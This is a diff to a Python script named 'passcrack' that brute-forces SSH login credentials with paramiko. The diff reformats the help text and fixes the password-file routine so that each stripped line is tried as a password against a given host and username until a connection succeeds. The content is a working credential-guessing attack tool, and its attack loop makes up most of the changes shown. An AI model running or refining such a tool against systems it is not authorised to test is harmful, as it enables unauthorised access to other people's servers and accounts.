@@ -2,10 +2,10 @@ import paramiko
 import hashlib
 
 print("Welcome to passcrack! Passcrack is a software used to brute-force ssh login credentials. ")
-print("Below are flags for each main service:\n    -a: Plaintext password cracking using a list of passwords")
-print("    -b: Plaintext password cracking using a specific password")
-print("    -c: Plaintext password cracking using a file of passwords")
-print("    -d: Password Cracking with various details")
+print("Below are flags for each main service:\n -a: Plaintext password cracking using a list of passwords")
+print(" -b: Plaintext password cracking using a specific password")
+print(" -c: Plaintext password cracking using a file of passwords")
+print(" -d: Password Cracking with various details")
 print("A command should look like this:\n   passcrack -b ssh")
 command = input("Enter a command: ")
 
@@ -40,6 +40,7 @@ def single_pass_plain(target_service):
     hostname = input("Hostname: ")
     username = input("Username: ")
     guess_pass = input("Password: ")
+
     if type(guess_pass) == str:
         # Attempts establishing a connection with the target system
         try:
@@ -56,22 +57,25 @@ def file_pass_plain(target_service):
     user = input("Username: ")
     guess_file = input("Password File: ")
     i = 0
+    lst_ = []
+    
     # Ensures the file is valid
     try:
         with open(guess_file, "r") as file_:
+            # Read the file line by line, strip any leading/trailing whitespace and append to lst_
             for lst in file_.readlines():
-                lst = str(lst).split(" ")
-            while i < len(lst):
-                # Attempts establishing a connection to the target system
-                try:
-                    target_service.connect(hostname=host, username=user, password=lst[i])
-                    print(f"Username & Password Found\nUsername: '{user}'\nPassword: '{lst[i]}'")
-                    break
-                except:
-                    print("...")
-                    i += 1
-                    if i == len(lst):
-                        print("Password Not Found")
+                lst_.append(lst.strip())  # Add each password to the list
+        
+        while i < len(lst_):
+            try:
+                target_service.connect(hostname=host, username=user, password=lst_[i])
+                print(f"Username & Password Found\nUsername: '{user}'\nPassword: '{lst_[i]}'")
+                break
+            except:
+                print("...")
+                i += 1
+                if i == len(lst_):
+                    print("Password Not Found")
     except FileNotFoundError:
         print("File Not Found")
 
